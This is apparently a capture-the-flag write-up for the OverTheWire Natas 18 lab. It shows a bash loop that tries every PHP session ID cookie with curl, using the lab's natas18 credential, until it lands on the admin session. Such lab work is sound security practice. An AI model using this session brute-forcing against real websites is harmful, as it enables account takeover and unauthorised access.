In this lab you are given a regular login page where you enter your username and
password. When you type anything in, you are told that you are logged in as a
regular user but you need to login as a regular user to retrieve the natas19
credentials. If you look at the source code you'll see that you can't even login
as admin, but the max php session id value is 640. This means that there are
only 641 (I assume id values start at 0 but it may be 1) cookies we have to try
to login as admin.

This only took a for loop with a curl command to iterate through all possible
cookies.

#!/bin/bash

for((i=0;i<641;i++))
do output=`curl -u natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP --silent --cookie "PHPSESSID=$i" http://natas18.natas.labs.overthewire.org`
   num_matched_lines=`echo $output | grep -cE 'You are logged in as a regular user.'`
   if [[ $num_matched_lines -ne 1 ]]
   then
       echo "$output";
       break
   fi
done
